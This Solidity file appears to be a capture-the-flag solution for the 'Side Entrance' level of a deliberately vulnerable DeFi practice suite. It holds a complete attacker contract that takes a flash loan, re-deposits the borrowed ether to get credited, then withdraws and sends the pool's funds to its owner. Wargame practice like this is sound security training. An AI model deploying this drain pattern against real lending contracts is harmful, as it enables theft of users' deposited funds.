// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract AttackerContract is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private pool;
    address payable private owner;
    uint256 private amount;

    constructor(address payable _owner, SideEntranceLenderPool _pool) {
        owner = _owner;
        pool = _pool;
    }

    function attack(uint256 _amount) external {
        amount = _amount;
        pool.flashLoan(_amount);
        pool.withdraw();
        owner.transfer(_amount);
    }

    function execute() external payable {
        pool.deposit{value: amount}();
    }

    receive() external payable {}
}
